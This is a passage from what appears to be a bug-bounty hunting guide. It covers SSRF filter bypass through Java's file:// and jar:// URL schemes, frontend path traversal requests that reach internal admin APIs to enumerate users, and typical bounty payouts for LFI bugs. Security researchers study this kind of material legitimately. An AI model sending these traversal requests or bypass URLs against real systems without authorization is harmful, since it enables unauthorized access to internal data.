- **jar://**: `new URL("jar:file:///path/to/file!/resource").openStream()` reads inside JAR archives or can trigger deserialization

This bypasses many HTTP-only SSRF filters since `file://` and `jar://` are valid URL protocols in Java.

### Frontend Path Traversal Hitting Internal-Only Backend API to Enumerate Users
In modern web apps, the frontend may proxy API requests through the web server. If a path traversal exists in the frontend route, you can hit internal-only backend APIs:
```
GET /api/../admin/users HTTP/1.1
GET /static/../../../internal/api/v1/users HTTP/1.1
```
This lets you enumerate users, access admin endpoints, or retrieve data not intended for public access.

## Payout: $500 - $12,000
Average: ~$1,500. Simple LFI/file read pays $500-$2,000. LFI leading to source code disclosure pays $1,000-$5,000. LFI to RCE (via log poisoning, session injection, or file write) pays $3,000-$12,000. Container escape LFI pays $2,000-$6,000.
